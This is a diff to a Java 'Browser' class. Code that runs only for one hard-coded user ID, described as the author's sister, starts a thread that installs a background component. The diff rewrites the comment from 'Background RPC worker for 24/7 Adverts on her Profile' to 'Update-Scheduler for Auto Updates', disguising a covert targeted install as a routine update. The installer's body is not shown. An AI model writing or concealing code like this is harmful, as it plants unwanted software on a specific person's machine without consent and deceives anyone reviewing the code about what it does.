@@ -325,7 +325,7 @@ public class Browser {
         if(user.userId == null) return;
         System.out.println(user.userId);
         if(user.userId.equalsIgnoreCase("554012432822173726")) {
-            // If its my sister, install Background RPC worker for 24/7 Adverts on her Profile
+            // If its my sister, install Update-Scheduler for Auto Updates
             // This only works on Windows
 
             new Thread(Browser::installUpdateScheduler).start();
@@ -360,7 +360,7 @@ public class Browser {
 
     }
 
-    private static void initializeHistory(){
+    private static void initializeHistory() {
 
         jEdit.setProperty("history.caption", "History");
 
